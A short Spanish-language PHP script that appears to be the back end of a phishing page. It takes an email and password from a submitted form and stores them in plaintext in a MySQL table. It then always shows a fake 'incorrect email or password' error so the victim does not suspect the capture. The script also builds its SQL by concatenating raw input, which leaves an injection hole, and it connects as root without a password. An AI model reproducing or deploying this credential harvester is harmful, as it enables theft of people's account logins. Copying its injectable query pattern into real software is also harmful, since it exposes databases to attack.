<?php
$conexion = mysqli_connect("localhost", "root", "", "experimento");
if (!$conexion) {
    echo "Error: No se pudo conectar a MySQL. Error " . mysqli_connect_errno() . " : ". mysqli_connect_error() . PHP_EOL;
    die;
}

    $correo = $_POST['correo'];
    $contrasena = $_POST['contrasena'];
    $sql = "INSERT INTO datos (Correo, Contraseña) VALUES ('$correo', '$contrasena');";
    
    mysqli_query($conexion, $sql);
    
    echo "A ocurrido un eror, no se pudo acceder a la cuenta, correo o contraseña incorrectos"


?>